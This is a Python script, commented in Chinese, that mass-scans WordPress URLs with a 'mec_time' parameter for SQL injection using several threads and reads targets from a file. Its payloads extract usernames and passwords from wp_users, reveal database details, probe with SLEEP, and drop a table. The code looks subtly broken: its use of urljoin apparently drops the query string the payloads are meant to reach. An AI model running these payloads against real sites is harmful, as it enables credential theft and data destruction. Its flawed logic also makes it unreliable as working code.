import requests
import threading
import time
import os
from datetime import datetime
from urllib.parse import urljoin
import sys
sys.stdout.reconfigure(encoding='utf-8')

# 設置請求超時和 User-Agent
TIMEOUT = 5
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

# SQL 注入 payload 清單
PAYLOADS = [
    "1' OR '1'='1",  # 基本注入
    "1' UNION SELECT username, password FROM wp_users; --",  # 提取用戶數據
    "1' AND SLEEP(5); --",  # 時間基注入（MySQL）
    "1' UNION SELECT database(), user(), version(); --",  # 提取數據庫信息
    "1'; DROP TABLE test_table; --"  # 破壞性測試（僅沙盒環境）
]

# 目標 URL 清單（可從檔案讀取）
TARGET_URLS = [
    "http://localhost/wp/?mec_time=",
    # 添加更多目標，例如："http://example.com/wp/?mec_time="
]

# 結果儲存檔案
LOG_FILE = f"sql_injection_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def log_result(url, payload, status, response_time, content_snippet, is_vulnerable):
    """記錄測試結果到檔案"""
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[*] 時間: {datetime.now()}\n")
        f.write(f"[*] 目標: {url}\n")
        f.write(f"[*] Payload: {payload}\n")
        f.write(f"[*] 狀態碼: {status}\n")
        f.write(f"[*] 響應時間: {response_time:.2f} 秒\n")
        f.write(f"[*] 響應片段: {content_snippet[:200]}\n")
        f.write(f"[*] 潛在漏洞: {'是' if is_vulnerable else '否'}\n")
        f.write("-" * 50 + "\n")

def test_sql_injection(url, payload):
    """測試單個 URL 和 payload"""
    try:
        full_url = urljoin(url, payload)
        start_time = time.time()
        response = requests.get(full_url, headers=HEADERS, timeout=TIMEOUT)
        response_time = time.time() - start_time

        # 檢查是否可能存在漏洞
        is_vulnerable = False
        content_snippet = response.text.lower()

        # 判斷條件
        if "error" in content_snippet or "mysql" in content_snippet:
            is_vulnerable = True  # 數據庫錯誤洩露
        elif "username" in content_snippet or "password" in content_snippet:
            is_vulnerable = True  # 敏感數據洩露
        elif "SLEEP(5)" in payload and response_time > 4.5:
            is_vulnerable = True  # 時間基注入成功

        log_result(url, payload, response.status_code, response_time, content_snippet, is_vulnerable)
        
        print(f"[+] 測試 {url} with {payload}")
        print(f"    狀態: {response.status_code}, 時間: {response_time:.2f} 秒")
        print(f"    漏洞: {'檢測到' if is_vulnerable else '未檢測到'}")
        
    except requests.exceptions.RequestException as e:
        log_result(url, payload, "錯誤", 0, str(e), False)
        print(f"[-] 錯誤 {url} with {payload}: {e}")

def test_target(target_url):
    """對單個目標執行所有 payload 測試"""
    for payload in PAYLOADS:
        test_sql_injection(target_url, payload)

def load_targets_from_file(file_path):
    """從檔案讀取目標 URL"""
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

def main():
    # 如果有目標檔案，讀取之
    target_file = "targets.txt"
    if os.path.exists(target_file):
        global TARGET_URLS
        TARGET_URLS.extend(load_targets_from_file(target_file))

    if not TARGET_URLS:
        print("[-] 無目標 URL，請在腳本中設置 TARGET_URLS 或提供 targets.txt")
        return

    print(f"[*] 開始測試 {len(TARGET_URLS)} 個目標，Payload 數量: {len(PAYLOADS)}")
    
    # 使用多執行緒測試
    threads = []
    for url in TARGET_URLS:
        thread = threading.Thread(target=test_target, args=(url,))
        threads.append(thread)
        thread.start()

    # 等待所有執行緒完成
    for thread in threads:
        thread.join()

    print(f"[*] 測試完成，結果已儲存至 {LOG_FILE}")

if __name__ == "__main__":
    main()